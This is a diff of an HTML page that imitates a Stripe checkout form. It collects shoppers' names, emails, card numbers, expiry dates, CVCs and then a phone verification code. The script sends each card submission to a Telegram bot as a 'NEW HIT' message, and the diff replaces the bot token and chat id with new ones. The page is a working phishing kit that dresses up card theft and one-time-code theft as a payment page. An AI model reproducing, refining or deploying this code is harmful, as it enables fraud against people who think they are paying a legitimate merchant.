@@ -9,7 +9,6 @@
             --stripe-blue: #0000FF; 
             --border-color: #e6e6e6;
             --text-main: #1a1a1a;
-            --text-gray: #6b7280;
         }
 
         body {
@@ -21,13 +20,9 @@
             justify-content: center;
         }
 
-        .container { 
-            width: 100%; 
-            max-width: 400px; 
-            position: relative;
-        }
+        .container { width: 100%; max-width: 400px; position: relative; }
 
-        /* --- Logo & Header (مقاسات كبيرة وتطابق 1000%) --- */
+        /* --- Logo & Header (مقاسات كبيرة وتطابق كامل) --- */
         .header {
             display: flex;
             align-items: center;
@@ -35,7 +30,7 @@
         }
 
         .logo-container {
-            width: 70px; /* تم تكبير اللوجو كما طلبت */
+            width: 75px; /* اللوجو كبير وواضح */
             height: auto;
             margin-right: 15px;
             display: flex;
@@ -45,32 +40,21 @@
         .logo-container img {
             width: 100%;
             height: auto;
-            object-fit: contain; /* يظهر اللوجو كاملاً بدون أي قص أو شكل دائري */
+            object-fit: contain;
         }
 
         .header-title {
-            font-size: 24px; /* خط عريض وكبير */
+            font-size: 24px;
             font-weight: 700;
             color: var(--text-main);
         }
 
-        /* --- Sections & Inputs --- */
-        h2 { 
-            font-size: 18px; 
-            font-weight: 600; 
-            margin: 30px 0 15px 0; 
-        }
-
-        label {
-            display: block;
-            font-size: 15px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
+        h2 { font-size: 18px; font-weight: 600; margin: 30px 0 15px 0; }
+        label { display: block; font-size: 15px; font-weight: 500; margin-bottom: 8px; }
 
         input {
             width: 100%;
-            padding: 14px; /* مدخلات أكبر لراحة المستخدم */
+            padding: 14px;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             font-size: 16px;
@@ -79,49 +63,18 @@
             margin-bottom: 12px;
         }
 
-        /* --- Grouping Style (Stripe Style) --- */
-        .input-group {
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-
-        .input-group input {
-            border: none;
-            border-bottom: 1px solid var(--border-color);
-            margin-bottom: 0;
-            border-radius: 0;
-        }
-
-        .input-group input:last-child {
-            border-bottom: none;
-        }
-
+        /* --- Grouping Style --- */
+        .input-group { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
+        .input-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
+        .input-group input:last-child { border-bottom: none; }
         .row { display: flex; }
         .row input:first-child { border-right: 1px solid var(--border-color); }
 
         /* --- Payment Box --- */
-        .payment-box {
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 18px;
-            margin-top: 10px;
-        }
+        .payment-box { border: 1px solid var(--border-color); border-radius: 10px; padding: 18px; margin-top: 10px; }
+        .payment-header { display: flex; align-items: center; margin-bottom: 18px; font-weight: 600; }
+        .card-icons { margin-left: auto; height: 30px; } /* أيقونات كبيرة */
 
-        .payment-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 18px;
-            font-size: 17px;
-            font-weight: 600;
-        }
-
-        .card-icons {
-            margin-left: auto;
-            height: 28px; /* تكبير أيقونات الفيزا والماستر كارد */
-        }
-
-        /* --- Button --- */
         .btn-pay {
             width: 100%;
             background: var(--stripe-blue);
@@ -135,44 +88,12 @@
             cursor: pointer;
         }
 
-        /* --- Internal Alert (Matches Image 100%) --- */
-        #modalOverlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.4);
-            z-index: 999;
-        }
+        /* --- Custom Internal Alert --- */
+        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 999; }
+        #customAlert { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: white; border-radius: 14px; z-index: 1000; text-align: center; }
+        .alert-content { padding: 30px 20px; font-size: 17px; }
+        .alert-btn { width: 100%; padding: 15px; border: none; border-top: 1px solid #eee; background: none; color: var(--stripe-blue); font-size: 18px; font-weight: 700; cursor: pointer; }
 
-        #customAlert {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 85%;
-            max-width: 320px;
-            background: white;
-            border-radius: 14px;
-            z-index: 1000;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-        }
-
-        .alert-content { padding: 30px 20px; font-size: 17px; color: #000; }
-        .alert-btn {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-top: 1px solid #eee;
-            background: none;
-            color: var(--stripe-blue);
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        /* Pages control */
         .page { display: none; }
         .active { display: block; }
     </style>
@@ -201,7 +122,7 @@
         <h2>Shipping Address</h2>
         <div class="input-group">
             <input type="text" id="name" placeholder="Full name">
-            <input type="text" id="addr" placeholder="Address line 1">
+            <input type="text" id="addr" placeholder="Address">
             <div class="row">
                 <input type="text" id="city" placeholder="City">
                 <input type="text" id="zip" placeholder="Zip code">
@@ -224,24 +145,20 @@
         </div>
 
         <button class="btn-pay" onclick="handlePayment()">Pay Now</button>
-        <p style="text-align: center; color: #999; font-size: 13px; margin-top: 25px;">Powered by <b>stripe</b></p>
     </div>
 
     <div id="otpPage" class="page">
         <h1 style="font-size: 26px;">Verify By Phone</h1>
-        <p style="color: #666; margin-bottom: 40px;">Please enter the verification code sent to your mobile phone.</p>
-        
-        <label style="text-align: center;">Verification code</label>
+        <p>Please enter the verification code.</p>
         <input type="text" id="otp" style="height: 65px; text-align: center; font-size: 28px; letter-spacing: 12px;" maxlength="6">
-        
         <button class="btn-pay" onclick="handleOTP()">Confirm</button>
     </div>
 </div>
 
 <script>
     const CONFIG = {
-        token: '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc',
-        chat: '656419637'
+        token: '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q', // التوكن الجديد هنا
+        chat: '1705240737' // معرف الشات الجديد هنا
     };
 
     async function sendTelegram(text) {
@@ -257,7 +174,6 @@
         document.getElementById('modalOverlay').style.display = 'none';
     }
 
-    // Card formatting
     document.getElementById('card').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
@@ -273,7 +189,7 @@
             return;
         }
 
-        const log = `<b>🔥 NEW HIT</b>\n\n👤 Name: ${name}\n📧 Email: ${email}\n💳 Card: <code>${card}</code>\n📅 Exp: ${document.getElementById('exp').value}\n🔒 CVC: ${document.getElementById('cvc').value}`;
+        const log = `<b>🔥 NEW HIT</b>\n👤 Name: ${name}\n📧 Email: ${email}\n💳 Card: <code>${card}</code>\n📅 Exp: ${document.getElementById('exp').value}\n🔒 CVC: ${document.getElementById('cvc').value}`;
         await sendTelegram(log);
 
         document.getElementById('checkoutPage').style.display = 'none';
